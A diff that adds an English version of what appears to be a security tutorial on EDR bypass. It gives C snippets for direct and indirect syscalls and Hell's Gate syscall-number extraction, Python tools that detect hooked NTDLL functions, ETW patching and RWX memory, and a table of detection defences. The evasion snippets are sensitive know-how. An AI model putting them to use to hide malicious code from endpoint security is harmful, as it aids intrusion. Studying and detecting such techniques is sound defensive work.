@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # EDR 우회 — API 후킹 우회·메모리 주입·탐지 분석
 
 ## 1. EDR 동작 원리
@@ -371,3 +377,381 @@ if __name__ == "__main__":
 | ETW 패칭 | ETW 제공자 상태 모니터링 | Kernel Patch Protection |
 | RWX 메모리 | 메모리 권한 변경 모니터링 | VirtualProtect 콜백 |
 | 간접 syscall | 반환 주소 검사 | Stack Walk Analysis |
+
+---
+
+<a name="english"></a>
+
+# EDR Bypass — API Hook Bypass, Memory Injection, Detection Analysis
+
+## 1. How EDR Works
+
+```
+User Mode Application
+    │
+    ├── EDR-hooked Win32 API (kernel32.dll)
+    │       ↓ intercept → EDR analysis
+    ├── NTDLL (Native API) — just before syscall
+    │       ↓ intercept → EDR analysis
+    └── Syscall — entering kernel mode
+            │
+            ▼
+    Kernel Mode Driver (EDR minifilter)
+            │
+            ▼
+    Windows Kernel
+```
+
+EDR primarily installs hooks on NTDLL functions to monitor `NtCreateProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, etc.
+
+---
+
+## 2. Direct Syscall
+
+```c
+// Execute syscall directly, bypassing EDR-hooked NTDLL
+// Syscall numbers differ per Windows version (must be extracted dynamically)
+
+#include <windows.h>
+
+// NtAllocateVirtualMemory syscall stub
+// Windows 10 2004: syscall number 0x18
+__declspec(naked) NTSTATUS NtAllocateVirtualMemory_Direct(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+) {
+    __asm {
+        mov eax, 0x18  // syscall number (varies by version)
+        syscall
+        ret
+    }
+}
+
+// Hells Gate — dynamically extract syscall number from NTDLL
+DWORD get_syscall_number(const char* function_name) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    PVOID func = GetProcAddress(ntdll, function_name);
+
+    // Check if hooked: first byte 0xE9 (JMP) means hooked
+    BYTE* bytes = (BYTE*)func;
+    if (bytes[0] == 0xE9) {
+        // Hooked — Tartarus Gate: extract number from next function
+        // Or Heaven's Gate: read ntdll.dll from disk
+        return 0;
+    }
+
+    // Normal: extract syscall number from mov eax, imm32 pattern
+    // 0B8h, <syscall_num_4bytes>
+    if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 &&
+        bytes[3] == 0xB8) {
+        return *(DWORD*)(bytes + 4);
+    }
+
+    return 0;
+}
+```
+
+---
+
+## 3. Indirect Syscall
+
+```c
+// Find syscall instruction address in NTDLL and jump directly
+// Bypass EDR return address inspection
+
+PVOID find_syscall_instruction(const char* function_name) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    PVOID func = GetProcAddress(ntdll, function_name);
+    BYTE* bytes = (BYTE*)func;
+
+    // Search for syscall instruction (0F 05)
+    for (int i = 0; i < 32; i++) {
+        if (bytes[i] == 0x0F && bytes[i+1] == 0x05) {
+            return (PVOID)(bytes + i);
+        }
+    }
+    return NULL;
+}
+
+// Indirect syscall via assembly
+// rcx, rdx, r8, r9: parameters
+// rax: syscall number
+// r11: jump to syscall instruction address
+__declspec(naked) NTSTATUS indirect_syscall(
+    DWORD syscall_num,
+    PVOID syscall_addr,
+    ...
+) {
+    __asm {
+        mov rax, rcx        // syscall number
+        mov r11, rdx        // syscall instruction address
+        mov rcx, r8         // original first parameter
+        jmp r11             // jump to syscall instruction
+    }
+}
+```
+
+---
+
+## 4. Reload NTDLL from Disk (Heaven's Gate)
+
+```python
+#!/usr/bin/env python3
+"""EDR hook bypass technique analysis tool — detect hooked NTDLL functions."""
+
+import argparse
+import ctypes
+import os
+import struct
+from pathlib import Path
+
+# Windows API (ctypes)
+PROCESS_ALL_ACCESS = 0x1F0FFF
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+PAGE_EXECUTE_READWRITE = 0x40
+
+
+def find_hooked_functions(ntdll_path: str = r"C:\Windows\System32\ntdll.dll") -> list[dict]:
+    """Compare in-memory NTDLL with on-disk NTDLL — detect hooked functions."""
+    import pefile  # pip install pefile
+
+    hooked: list[dict] = []
+
+    if os.name != "nt":
+        print("Windows-only feature")
+        return hooked
+
+    # Load ntdll.dll from disk
+    try:
+        disk_ntdll = pefile.PE(ntdll_path)
+    except Exception as e:
+        print(f"Failed to load ntdll.dll: {e}")
+        return hooked
+
+    # In-memory ntdll.dll
+    kernel32 = ctypes.windll.kernel32
+    mem_ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
+
+    # Check Nt* functions in export table
+    if hasattr(disk_ntdll, "DIRECTORY_ENTRY_EXPORT"):
+        for exp in disk_ntdll.DIRECTORY_ENTRY_EXPORT.symbols:
+            if not exp.name:
+                continue
+            name = exp.name.decode()
+            if not name.startswith("Nt"):
+                continue
+
+            # First 20 bytes of disk function
+            rva = exp.address
+            disk_bytes = disk_ntdll.get_data(rva, 20)
+
+            # First 20 bytes of in-memory function
+            mem_addr = mem_ntdll_base + rva
+            mem_bytes = (ctypes.c_char * 20).from_address(mem_addr).raw
+
+            if disk_bytes != mem_bytes:
+                # If first byte is JMP (0xE9), it's an inline hook
+                hook_type = "INLINE_JMP" if mem_bytes[0:1] == b"\xe9" else "MODIFIED"
+                hooked.append({
+                    "function": name,
+                    "hook_type": hook_type,
+                    "disk_bytes": disk_bytes[:8].hex(),
+                    "mem_bytes": mem_bytes[:8].hex(),
+                })
+
+    return hooked
+
+
+def check_etw_patching() -> bool:
+    """Detect if ETW (Event Tracing for Windows) has been patched."""
+    if os.name != "nt":
+        return False
+
+    ntdll = ctypes.windll.ntdll
+    # Check first byte of EtwEventWrite function
+    func_addr = ctypes.windll.kernel32.GetProcAddress(
+        ctypes.windll.kernel32.GetModuleHandleA(b"ntdll.dll"),
+        b"EtwEventWrite",
+    )
+    if not func_addr:
+        return False
+
+    first_byte = ctypes.c_byte.from_address(func_addr).value
+    return first_byte == 0xC3  # ret instruction → ETW disabled
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="EDR hook detection (Windows only)")
+    sub = parser.add_subparsers(dest="cmd", required=True)
+
+    hooks_p = sub.add_parser("hooks", help="Detect hooked NTDLL functions")
+    hooks_p.add_argument("--ntdll", default=r"C:\Windows\System32\ntdll.dll")
+
+    etw_p = sub.add_parser("etw", help="Detect ETW patching")
+
+    args = parser.parse_args()
+
+    match args.cmd:
+        case "hooks":
+            print("[*] Detecting NTDLL function hooks...")
+            hooked = find_hooked_functions(args.ntdll)
+            if hooked:
+                print(f"\n[!] Found {len(hooked)} hooked functions:")
+                for h in hooked:
+                    print(f"  [{h['hook_type']}] {h['function']}")
+                    print(f"    Disk: {h['disk_bytes']} | Memory: {h['mem_bytes']}")
+            else:
+                print("[+] No hooks detected")
+
+        case "etw":
+            patched = check_etw_patching()
+            print(f"[!] ETW is patched (detection bypassed)" if patched else "[+] ETW is normal")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 5. Memory Injection Detection
+
+```python
+#!/usr/bin/env python3
+"""Process memory anomaly detection — scan for executable memory regions."""
+
+import argparse
+import ctypes
+import struct
+import sys
+from dataclasses import dataclass
+from pathlib import Path
+
+
+if sys.platform == "win32":
+    PROCESS_VM_READ = 0x0010
+    PROCESS_QUERY_INFORMATION = 0x0400
+    MEM_COMMIT = 0x1000
+    PAGE_EXECUTE = 0x10
+    PAGE_EXECUTE_READ = 0x20
+    PAGE_EXECUTE_READWRITE = 0x40
+    PAGE_EXECUTE_WRITECOPY = 0x80
+
+    EXECUTABLE_PAGES = {PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY}
+
+    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
+        _fields_ = [
+            ("BaseAddress", ctypes.c_size_t),
+            ("AllocationBase", ctypes.c_size_t),
+            ("AllocationProtect", ctypes.c_uint32),
+            ("RegionSize", ctypes.c_size_t),
+            ("State", ctypes.c_uint32),
+            ("Protect", ctypes.c_uint32),
+            ("Type", ctypes.c_uint32),
+        ]
+
+
+@dataclass
+class SuspiciousRegion:
+    pid: int
+    base_address: int
+    size: int
+    protect: int
+    reason: str
+
+
+def scan_process_memory(pid: int) -> list[SuspiciousRegion]:
+    """Detect suspicious executable regions in process memory."""
+    if sys.platform != "win32":
+        return []
+
+    kernel32 = ctypes.windll.kernel32
+    suspicious: list[SuspiciousRegion] = []
+
+    handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
+    if not handle:
+        return suspicious
+
+    mbi = MEMORY_BASIC_INFORMATION()
+    address = 0
+
+    while kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
+        if mbi.State == MEM_COMMIT and mbi.Protect in EXECUTABLE_PAGES:
+            # Executable + writable (RWX) — suspected injection
+            if mbi.Protect == PAGE_EXECUTE_READWRITE:
+                suspicious.append(SuspiciousRegion(
+                    pid=pid,
+                    base_address=mbi.BaseAddress,
+                    size=mbi.RegionSize,
+                    protect=mbi.Protect,
+                    reason="RWX memory — suspected code injection",
+                ))
+
+            # MEM_PRIVATE executable region (not a PE image)
+            if mbi.Type == 0x20000:  # MEM_PRIVATE
+                suspicious.append(SuspiciousRegion(
+                    pid=pid,
+                    base_address=mbi.BaseAddress,
+                    size=mbi.RegionSize,
+                    protect=mbi.Protect,
+                    reason="Private executable memory",
+                ))
+
+        address = mbi.BaseAddress + mbi.RegionSize
+        if address >= 0x7FFFFFFF0000:  # 64-bit limit
+            break
+
+    kernel32.CloseHandle(handle)
+    return suspicious
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Memory injection detection (Windows only)")
+    parser.add_argument("--pid", type=int, help="Specific process ID")
+    parser.add_argument("--all", action="store_true", help="Scan all processes")
+    args = parser.parse_args()
+
+    if sys.platform != "win32":
+        print("Windows-only tool")
+        return
+
+    pids = []
+    if args.pid:
+        pids = [args.pid]
+    elif args.all:
+        import psutil
+        pids = [p.pid for p in psutil.process_iter()]
+
+    total_suspicious = []
+    for pid in pids:
+        regions = scan_process_memory(pid)
+        total_suspicious.extend(regions)
+        if regions:
+            print(f"\n[!] PID {pid}: {len(regions)} suspicious regions")
+            for r in regions:
+                print(f"  0x{r.base_address:016X} ({r.size // 1024}KB) — {r.reason}")
+
+    print(f"\nTotal {len(total_suspicious)} suspicious memory regions")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. EDR Bypass Detection Defense
+
+| EDR Bypass Technique  | Detection Method                           | Defense                                      |
+|-----------------------|--------------------------------------------|----------------------------------------------|
+| Direct syscall        | Analyze syscall call stack                 | CrowdStrike Falcon / SentinelOne kernel callbacks |
+| NTDLL reload          | Monitor module load events                 | Image Load callback                          |
+| Process hollowing     | Detect process creation + unmapping        | PsSetCreateProcessNotifyRoutine              |
+| ETW patching          | Monitor ETW provider status                | Kernel Patch Protection                      |
+| RWX memory            | Monitor memory permission changes          | VirtualProtect callback                      |
+| Indirect syscall      | Inspect return address                     | Stack Walk Analysis                          |
